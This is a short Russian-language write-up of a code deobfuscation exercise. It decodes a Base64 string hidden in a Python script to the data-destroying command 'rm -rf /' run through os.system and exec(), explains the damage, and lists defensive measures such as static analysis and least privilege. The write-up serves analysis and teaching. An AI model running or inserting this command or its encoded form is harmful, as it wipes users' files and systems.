# Деобфускация кода

## Шаг 1. Расшифровка строки

Строка в переменной `a` закодирована в Base64. Результат декодирования:

```
import os; os.system('rm -rf /')
```

Проверка средствами Python:

```python
import base64
print(base64.b64decode(
    "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
).decode("utf-8"))
```

## Шаг 2. Анализ угрозы

Обфусцированный скрипт декодирует скрытую строку и передает её в `exec()`,
то есть выполняет произвольный код Python во время исполнения программы.
Расшифрованное содержимое:

```python
import os; os.system('rm -rf /')
```

Команда `rm -rf /` рекурсивно (**-r**) и без запроса подтверждения (**-f**)
удаляет **все файлы от корня файловой системы**. При запуске с правами
обычного пользователя будет уничтожено всё, к чему есть доступ на запись
(домашняя директория, временные файлы и т. д.); при запуске с правами
администратора (root) будет полностью уничтожена операционная система:
конфигурация, программы и все данные пользователя. Это классический пример
RCE-трояна / логической бомбы, замаскированной под безобидный код.

## Шаг 3. Методы защиты

1. **Запрет опасных функций**: в статическом анализаторе и на code review
   запрещать `exec()`, `eval()`, `os.system`, `subprocess` с данными,
   полученными из внешних источников (bandit: правило B102 — exec_used).
2. **Валидация входных данных**: никогда не подавать на вход `exec`/`eval`
   данные из недоверенных источников (ввод пользователя, файлы, сеть).
3. **Статический анализ в CI**: линтеры и SAST-сканеры (flake8 + bandit,
   semgrep) в пайплайне, как в Этапе 4 практики.
4. **Принцип наименьших привилегий**: запуск сервисов от непривилегированного
   пользователя, изоляция (контейнеры, chroot), чтобы `rm -rf /` не смог
   уничтожить систему целиком.
5. **Аудит зависимостей**: проверка пакетов перед установкой, lock-файлы,
   доверенные источники (pip от официальных индексов).
